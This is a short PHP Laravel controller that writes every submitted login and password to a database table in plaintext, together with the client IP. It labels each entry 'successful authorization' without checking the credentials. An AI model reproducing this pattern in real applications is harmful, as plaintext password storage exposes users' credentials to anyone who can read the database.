<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests\ErrorRequest;
use App\Models\autorizations;
use App\Http\Controllers\DB;

class autorizationsController extends Controller
{
    public function submit(ErrorRequest $auth){

 $autorization = new autorizations();
 $autorization->error = 'Успешная авторизация';
 $autorization->login = $auth->input('login');
 $autorization->password = $auth->input('password');
 $autorization->ip = \Request::ip();
 

 $autorization->save();

}

}